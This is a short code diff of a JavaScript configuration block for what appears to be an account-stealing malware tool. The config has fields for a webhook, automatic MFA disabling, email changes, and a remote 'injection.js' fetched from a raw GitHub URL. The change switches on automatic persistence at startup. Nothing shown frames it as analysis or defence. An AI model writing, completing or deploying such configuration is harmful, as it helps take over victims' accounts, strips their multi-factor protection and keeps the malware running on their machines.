@@ -35,7 +35,7 @@ const CONFIG = {
     webhook: '%WEBHOOK_BRO%',
     API: 'null',
     auto_user_profile_edit: 'false',
-    auto_persist_startup: '%false',
+    auto_persist_startup: 'true',
     auto_mfa_disabler: 'true',
     auto_email_update: 'false',
     injection_url: 'https://raw.githubusercontent.com/allahsanaheyecan/banadahuzurversin/refs/heads/main/injection.js',
